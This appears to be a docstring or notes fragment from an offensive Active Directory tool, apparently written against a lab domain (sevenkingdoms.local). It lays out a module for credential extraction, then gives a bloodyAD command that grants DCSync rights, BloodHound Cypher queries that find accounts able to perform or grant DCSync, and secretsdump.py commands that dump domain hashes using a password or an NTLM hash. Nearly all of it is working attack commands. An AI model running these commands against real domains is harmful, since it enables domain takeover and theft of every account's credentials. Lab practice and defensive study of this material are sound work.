"""
│   ├── credential_techniques.py ← hash/password extraction
│   │   ├── _do_dcsync
│   │   └── _do_read_laps

    bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <target_sam>
    Yes! GetChanges + GetChangesAll together are DCSync — BloodHound just represents them as separate edges.
    MATCH p=(:Base)-[:DCSync|GetChanges|GetChangesAll]->(:Domain)
    RETURN p
    LIMIT 1000
vagrant (User) 
  → MemberOf → Administrators (Group)
  → GetChanges + GetChangesAll → Domain
  ∴ vagrant can DCSync
    Or find who can GRANT DCSync (has WriteDacl on Domain)
cypher

MATCH p=(:Base)-[:WriteDacl]->(:Domain)
RETURN p
LIMIT 25
cypher

MATCH p=(:Base)-[:GenericAll]->(:Domain)
RETURN p
LIMIT 25
These principals can call _do_grant_dcsync to give themselves GetChanges + GetChangesAll.
# Linux/WSL
secretsdump.py -just-dc sevenkingdoms.local/vagrant:vagrant@192.168.56.10

# or with hash
secretsdump.py -just-dc -hashes :9029cf007326107eb1c519c84ea60dbe sevenkingdoms.local/vagrant@192.168.56.10
    """